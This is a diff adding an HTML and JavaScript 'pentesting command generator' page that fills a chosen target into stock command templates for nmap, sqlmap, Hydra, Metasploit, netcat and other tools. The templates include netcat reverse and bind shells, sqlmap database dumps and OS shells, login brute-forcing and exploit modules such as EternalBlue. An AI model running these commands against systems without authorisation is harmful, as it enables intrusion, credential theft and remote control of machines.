@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DarkCyberGroot Pentesting Command Generator</title>
+    <style>
+        body {
+            background-color: #2e2e2e;
+            color: #f5f5f5;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            width: 80%;
+            margin: 0 auto;
+            padding-top: 20px;
+        }
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .tool {
+            margin-bottom: 20px;
+        }
+        input[type="text"] {
+            width: 80%;
+            padding: 10px;
+            background-color: #444;
+            color: #fff;
+            border: 1px solid #555;
+            margin-right: 10px;
+        }
+        select {
+            padding: 10px;
+            background-color: #444;
+            color: #fff;
+            border: 1px solid #555;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #555;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #666;
+        }
+        pre {
+            background-color: #1e1e1e;
+            color: #f5f5f5;
+            padding: 10px;
+            border: 1px solid #444;
+            overflow-x: auto;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Pentesting Toolkit Command Generator</h1>
+
+        <div class="tool">
+            <input type="text" id="target_input" placeholder="Enter IP/URL">
+            <select id="tool_select" onchange="generateCommands()">
+                <option value="" disabled selected>Select a Tool</option>
+                <option value="nmap">Nmap</option>
+                <option value="nikto">Nikto</option>
+                <option value="gobuster">Gobuster</option>
+                <option value="sqlmap">SQLmap</option>
+                <option value="metasploit">Metasploit</option>
+                <option value="hydra">Hydra</option>
+                <option value="john">John the Ripper</option>
+                <option value="burpsuite">Burp Suite</option>
+                <option value="wpscan">Wpscan</option>
+                <option value="netcat">Netcat</option>
+            </select>
+        </div>
+
+        <div class="tool">
+            <select id="command_select" onchange="displayCommand()">
+                <option value="" disabled selected>Select a Command</option>
+                <!-- Commands will be dynamically inserted here -->
+            </select>
+        </div>
+
+        <pre id="command_output"></pre>
+    </div>
+
+    <script>
+        const commands = {
+            nmap: [
+                "nmap -sV [TARGET]",
+                "nmap -O [TARGET]",
+                "nmap -p 1-65535 -sV -sS -T4 [TARGET]",
+                "nmap --script vuln [TARGET]",
+                "nmap -A [TARGET]",
+                "nmap -Pn [TARGET]",
+                "nmap -sS -sU -T4 [TARGET]",
+                "nmap -sP [TARGET]",
+                "nmap -sC [TARGET]",
+                "nmap -sn [TARGET]"
+            ],
+            nikto: [
+                "nikto -h [TARGET]",
+                "nikto -h [TARGET] -ssl",
+                "nikto -h [TARGET] -p 443",
+                "nikto -h [TARGET] -Tuning x 6",
+                "nikto -h [TARGET] -o output.txt",
+                "nikto -h [TARGET] -Format html",
+                "nikto -h [TARGET] -Plugins",
+                "nikto -h [TARGET] -Cgidirs /cgi-bin/",
+                "nikto -h [TARGET] -Display V",
+                "nikto -h [TARGET] -evasion 1"
+            ],
+            gobuster: [
+                "gobuster dir -u [TARGET] -w wordlist.txt",
+                "gobuster dns -d [TARGET] -w wordlist.txt",
+                "gobuster vhost -u [TARGET] -w wordlist.txt",
+                "gobuster dir -u [TARGET] -w wordlist.txt -x php,html,txt",
+                "gobuster dir -u [TARGET] -w wordlist.txt -t 50",
+                "gobuster dir -u [TARGET] -w wordlist.txt -o output.txt",
+                "gobuster dir -u [TARGET] -w wordlist.txt -r",
+                "gobuster dir -u [TARGET] -w wordlist.txt -s '200,204,301,302,307,403'",
+                "gobuster dir -u [TARGET] -w wordlist.txt -k",
+                "gobuster dir -u [TARGET] -w wordlist.txt -l"
+            ],
+            sqlmap: [
+                "sqlmap -u [TARGET] --dbs",
+                "sqlmap -u [TARGET] -D [DB_NAME] --tables",
+                "sqlmap -u [TARGET] -D [DB_NAME] -T [TABLE_NAME] --columns",
+                "sqlmap -u [TARGET] -D [DB_NAME] -T [TABLE_NAME] --dump",
+                "sqlmap -u [TARGET] --batch",
+                "sqlmap -u [TARGET] --level=5 --risk=3",
+                "sqlmap -u [TARGET] --crawl=10",
+                "sqlmap -u [TARGET] --threads=10",
+                "sqlmap -u [TARGET] --os-shell",
+                "sqlmap -u [TARGET] --dbms=mysql"
+            ],
+            metasploit: [
+                "msfconsole -q -x 'use exploit/multi/handler'",
+                "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue'",
+                "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor'",
+                "msfconsole -q -x 'use exploit/linux/http/apache_mod_cgi_bash_env_exec'",
+                "msfconsole -q -x 'use exploit/windows/http/rejetto_hfs_exec'",
+                "msfconsole -q -x 'use exploit/multi/http/struts2_content_type_ognl'",
+                "msfconsole -q -x 'use exploit/windows/browser/ms14_064_ole_code_execution'",
+                "msfconsole -q -x 'use exploit/unix/webapp/drupal_drupalgeddon2'",
+                "msfconsole -q -x 'use exploit/linux/local/dirtycow'",
+                "msfconsole -q -x 'use auxiliary/scanner/smb/smb_version'"
+            ],
+            hydra: [
+                "hydra -l admin -P password_list.txt [TARGET] http-post-form '/login.php:user=^USER^&pass=^PASS^:F=incorrect'",
+                "hydra -L users.txt -P passwords.txt [TARGET] ssh",
+                "hydra -l admin -P password_list.txt [TARGET] ftp",
+                "hydra -l admin -P password_list.txt [TARGET] smb",
+                "hydra -l admin -P password_list.txt [TARGET] telnet",
+                "hydra -l admin -P password_list.txt [TARGET] rdp",
+                "hydra -l admin -P password_list.txt [TARGET] smtp",
+                "hydra -l admin -P password_list.txt [TARGET] snmp",
+                "hydra -l admin -P password_list.txt [TARGET] http-get",
+                "hydra -l admin -P password_list.txt [TARGET] http-head"
+            ],
+            john: [
+                "john --wordlist=password_list.txt [TARGET]",
+                "john --rules --wordlist=password_list.txt [TARGET]",
+                "john --incremental [TARGET]",
+                "john --show [TARGET]",
+                "john --single [TARGET]",
+                "john --wordlist=password_list.txt --format=raw-md5 [TARGET]",
+                "john --wordlist=password_list.txt --format=nt [TARGET]",
+                "john --wordlist=password_list.txt --session=crack_session [TARGET]",
+                "john --wordlist=password_list.txt --format=zip [TARGET]",
+                "john --restore=crack_session"
+            ],
+            burpsuite: [
+                "Burp Suite (requires manual execution from GUI)",
+                "Burp Suite with Intruder for brute force",
+                "Burp Suite with Repeater for manual testing",
+                "Burp Suite with Scanner for vulnerability detection",
+                "Burp Suite with Spider for content discovery",
+                "Burp Suite with Proxy for intercepting requests",
+                "Burp Suite with Sequencer for token analysis",
+                "Burp Suite with Decoder for decoding data",
+                "Burp Suite with Comparer for comparing requests",
+                "Burp Suite with Extender for custom extensions"
+            ],
+            wpscan: [
+                "wpscan --url [TARGET]",
+                "wpscan --url [TARGET] --enumerate p",
+                "wpscan --url [TARGET] --enumerate u",
+                "wpscan --url [TARGET] --enumerate t",
+                "wpscan --url [TARGET] --api-token [API_TOKEN]",
+                "wpscan --url [TARGET] --passwords password_list.txt",
+                "wpscan --url [TARGET] --random-agent",
+                "wpscan --url [TARGET] --wp-content-dir wp-content",
+                "wpscan --url [TARGET] --usernames admin",
+                "wpscan --url [TARGET] --plugins-detection aggressive"
+            ],
+            netcat: [
+                "nc -lvp [PORT]",
+                "nc -v [TARGET] [PORT]",
+                "nc -nvv [TARGET] [PORT]",
+                "nc -zv [TARGET] [PORT_RANGE]",
+                "nc -lvp [PORT] > received_file",
+                "nc -nv [TARGET] [PORT] < file_to_send",
+                "nc -e /bin/sh [TARGET] [PORT]",
+                "nc -e cmd.exe [TARGET] [PORT]",
+                "nc -zv [TARGET] 1-65535",
+                "nc -l -p [PORT] -e /bin/bash"
+            ]
+        };
+
+        function generateCommands() {
+            var tool = document.getElementById("tool_select").value;
+            var target = document.getElementById("target_input").value;
+            var commandSelect = document.getElementById("command_select");
+
+            // Clear previous commands
+            commandSelect.innerHTML = '<option value="" disabled selected>Select a Command</option>';
+
+            // Populate with new commands
+            commands[tool].forEach(function(cmd) {
+                var option = document.createElement("option");
+                option.value = cmd.replace("[TARGET]", target);
+                option.text = cmd.replace("[TARGET]", target);
+                commandSelect.appendChild(option);
+            });
+        }
+
+        function displayCommand() {
+            var command = document.getElementById("command_select").value;
+            document.getElementById("command_output").textContent = command;
+        }
+    </script>
+</body>
+</html>
+
